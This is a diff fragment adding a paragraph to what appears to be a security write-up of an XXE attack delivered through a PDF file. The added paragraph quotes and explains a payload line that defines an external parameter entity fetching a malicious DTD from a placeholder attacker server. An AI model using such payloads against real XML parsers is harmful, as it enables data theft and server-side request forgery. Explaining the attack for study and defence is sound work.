@@ -90,6 +90,10 @@ Content of the malicious DTD (poc.dtd):
 
 Here's the breakout from all of this:
 
+The first payload is what I inserted on the PDF file:
+
+1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named %ext. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`
+
 
 
 
